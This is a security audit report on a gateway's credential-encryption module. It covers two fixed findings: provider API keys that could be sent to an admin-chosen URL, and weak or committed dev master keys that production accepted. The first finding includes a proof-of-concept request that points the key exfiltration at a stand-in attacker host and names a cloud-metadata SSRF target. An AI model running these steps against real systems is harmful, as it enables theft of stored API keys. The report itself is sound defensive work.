# M2 — Credential encryption (provider API keys)

> Phase 1 module audit. Base `77e86466f`. Confirmed findings only (≥2/3 adversarial Opus verifiers
> voted `real`). Each carries persona · invariant · PoC · `file:line@SHA` · re-check probe · remediation.

---

## SEC-M2-01 — AI-Guard `external_url` backend exfiltrates any decrypted provider API key to an admin-chosen arbitrary URL — **HIGH** (3/3)

> **STATUS: FIXED** (2026-06-08, brought forward at user request). Remediation = Option A (full
> delete of the credential reference) + an `https://` scheme guard. The `external_url` judge now
> authenticates **only** via operator-supplied `CustomHeaders`; the config has no field that can
> reference a stored `Credential`, so a provider key can never be forwarded to an operator-chosen
> URL. Re-check probes below all pass against HEAD.
>
> **Changes:** removed `ExternalCredentialID` from the canonical config struct + DB column (migration
> `20260624000000_drop_aiguardconfig_external_credential_id`) + Go configtypes mirror + the AI-gateway
> `GetDecrypted` resolve + `ExternalBackend.APIKey` field + the `Authorization: Bearer` line + CP UI
> input + i18n (en/es/zh, src + public) + OpenAPI specs + seed. Added `https://`
> validation in `PutConfig`. Regression tests: `TestPutConfig_RejectsNonHttpsExternalURL`,
> `TestLiveClassifier_buildBackend_externalURL_noProviderCredential`, and the rewritten
> `TestExternalBackend_HappyPath` (auth asserted to flow only via CustomHeaders).
>
> **Re-check probes (all ✓ at HEAD):** (1) `rg 'Authorization".*Bearer.*b\.APIKey' backend_external.go` → gone; (2) `rg 'GetDecrypted\(ctx, \*cfg\.ExternalCredentialID\)' wiring/aiguard.go` → gone; (3) `rg 'u.Scheme != "https"' handler.go` → present; (4) `rg 'ExternalCredentialID' configstore/aiguard.go` → gone.
>
> **End-to-end PoC (pre-fix, for the record — now blocked):** as a holder of `ai-guard-config:update`,
> `PUT /api/admin/ai-guard/config {backendMode:"external_url", externalUrl:"http://attacker/collect",
> externalCredentialId:"<victim-cred-uuid>"}` → `POST /api/admin/ai-guard/dry-run` → the listener at
> `attacker/collect/chat/completions` receives `Authorization: Bearer <decrypted victim provider key>`.
> Post-fix this is impossible at three layers: the field no longer exists (Bind drops it), `PutConfig`
> rejects the `http://` URL with 400, and the gateway resolves no credential on the `external_url` path.

- **Persona:** A5 low-priv insider admin (holds `ai-guard-config:update`, a normal compliance-config tier — not super-admin). A4 benefits secondarily when `http://` is used.
- **Invariant:** A decrypted provider credential must only ever be transmitted to the upstream provider it belongs to, over an authenticated channel — never to an operator-chosen, unvalidated, non-allowlisted destination.
- **Cross-ref:** related to arch `F-0269` (simulator SSRF host-pin) but a **distinct, unfixed** path — the AI-guard external backend has no equivalent guard.

**Preconditions.** Attacker holds a custom role with `ai-guard-config:update` (resource `ai-guard-config`, verb `Update`; `catalog_data.go:67`). ≥1 `Credential` row exists for a real provider. AI Gateway wired with the AI-guard external backend (default wiring; `thingclient.go:381`).

**Attack steps.**
1. `PUT /api/admin/ai-guard/config` with `backendMode="external_url"`, `externalUrl="http://attacker.evil/collect"` (or an SSRF target like `http://169.254.169.254/...`), and `externalCredentialId` = the UUID of the **victim** production provider credential. `PutConfig` (`handler.go:172-265`) validates ONLY that `externalUrl` is non-empty (`handler.go:188-193`) — no scheme check, no host allowlist, **no binding of credential→URL**. Row saved; Hub `ai_guard` invalidation fires; gateway reloads.
2. Trigger immediately via `POST /api/admin/ai-guard/dry-run` (same gate, `handler.go:156`), or wait for the next inbound request that runs the detector.
3. Gateway `buildBackend` resolves the credential: `CredentialMgr.GetDecrypted(ctx, *cfg.ExternalCredentialID)` decrypts the victim key (`aiguard.go:132-137`) → `ExternalBackend{URL: attacker_url, APIKey: victim_plaintext}` (`aiguard.go:154-159`).
4. `ExternalBackend.Call` POSTs to `b.URL+"/chat/completions"` with `req.Header.Set("Authorization", "Bearer "+b.APIKey)` (`backend_external.go:54-60`), dialed by `l.ExtHTTPClient` — a plain `nexushttp.New` client with **no SSRF-guarded dialer** (`thingclient.go:381-384`). The attacker endpoint receives the cleartext provider key. With `http://`, the key also crosses the wire in cleartext (A4 sniff).

**Yield:** full exfiltration of every stored provider API key, one credential-id at a time, by a low-privilege insider — a crown-jewel compromise of the credential vault's entire purpose.

- **Affected:** `packages/ai-gateway/internal/policy/aiguard/backend_external.go:60`; `packages/ai-gateway/cmd/ai-gateway/wiring/aiguard.go:132-159`; `packages/control-plane/internal/governance/aiguard/handler/handler.go:188-193`; `packages/ai-gateway/cmd/ai-gateway/wiring/thingclient.go:381-384`.
- **Re-check probe.** Static: `rg -n 'Authorization", "Bearer "\+b.APIKey' packages/ai-gateway/internal/policy/aiguard/backend_external.go` must be guarded by a URL-allowlist/SSRF check. Negative: `rg -n 'ExternalURL' packages/control-plane/internal/governance/aiguard/handler/handler.go` should show host-allowlist/scheme validation near `PutConfig`; its absence re-flags. Dynamic: set `external_url` to `http://127.0.0.1:9999` with any cred UUID, run dry-run, assert a listener on `:9999` receives an `Authorization: Bearer` whose token decrypts to a real provider key.
- **Remediation.** Two independent controls: **(1)** bind credential→URL — when `backendMode=external_url`, require `ExternalCredentialID`'s provider `BaseURL` host to match `externalUrl` host, OR forbid pairing a provider credential with an arbitrary `external_url` (introduce a scoped `external-judge` secret type that can never be a provider key). **(2)** validate `externalUrl` at `PutConfig`: enforce `https://` + the same SSRF-guarded dialer/allowlist as the F-0269 fix; wire `ExtHTTPClient` to that guarded dialer so internal/link-local/metadata targets are rejected at dial. Consider elevating the credential-pairing capability to a higher IAM tier — it can now move secrets.

---

## SEC-M2-02 — No weak/known-key rejection at boot:  
> **STATUS: FIXED** (2026-06-09) — new shared `keycheck.ValidateMasterKey` rejects all-zero / single-repeat / <16-distinct-byte master keys; wired into CP InitVault, ai-gateway NewDecryptor, Hub ChannelSecretCipherFromEnv. dev-start.sh now derives dev keys from openssl/`/dev/urandom`. Regression tests at each site.

### (original) fixed dev key and all-zeros pass every `CREDENTIAL_ENCRYPTION_KEY` validation in production — **MEDIUM** (3/3)

- **Persona:** A6 host/log read (realized by A5 insider or A4 if the weak key is guessed).
- **Invariant:** A credential-master key admitted in production must have cryptographic-strength entropy; a publicly-known or trivially-guessable value must be refused at boot.

**Preconditions.** Deployment supplies `CREDENTIAL_ENCRYPTION_KEY` with `CONTROL_PLANE_CRYPTO_PRODUCTION=true` (or AI-gw production) but the value is a known/example/dev key — e.g. CI copies a developer `.env` to prod, an operator pastes the `dev-start.sh` fallback, or any all-zeros/repeated-byte value.

**Attack steps.**
1. `InitVault` (`aes_gcm.go:67`) and `creddecrypt.NewDecryptor` (`decrypt.go:28`) validate ONLY: non-empty (prod), `len(keyHex)==64`, valid hex, decoded `len==32`. Shape/presence, never **quality**.
2. The committed dev fallback `0123456789abcdef…` (`scripts/dev-start.sh:111`) satisfies all four; so does all-zeros, a repeated byte, or any leaked example.
3. `CONTROL_PLANE_CRYPTO_PRODUCTION` (`config.go:379`) and AI-gw `validate()` (`config.go:420`) gate on whether a key is **set**, not whether it is strong.
4. A production instance boots cleanly under a key that is in a public repo. An attacker who knows the dev key (committed in `dev-start.sh`) decrypts any exfiltrated `Credential` row (ciphertext+iv+tag stored together) **offline** — every provider key and Hub alert-channel secret — without touching the env. At-rest protection collapses to zero for that deployment.

- **Affected:** `packages/control-plane/internal/platform/crypto/aes_gcm.go:80-90`; `packages/ai-gateway/internal/credentials/decrypt/decrypt.go:33-35`; `packages/nexus-hub/internal/alerts/engine/secret.go:69-72`; `scripts/dev-start.sh:111`.
- **Re-check probe.** `grep -rn "len(key) != 32\|len(keyHex) != 64" packages/*/internal/**/crypto* packages/*/internal/credentials/decrypt`, then confirm NO weak-key denylist: `rg -n "0123456789abcdef|allZero|isWeakKey|denylist|bytes.Repeat" packages --glob '!**/*_test.go'` returns zero hits inside the key-init functions. Test: feed `InitVault`/`NewDecryptor` the dev key and assert REJECTED (currently passes).
- **Remediation.** At boot, after hex-decode, reject in production mode: (a) known committed dev key value(s), (b) all-zeros, (c) degenerate byte distribution (<16 distinct bytes). Cheapest correct form: a small denylist of the repo's example/dev keys, fail-closed with a clear boot error. Independent of the deferred KMS roadmap row.
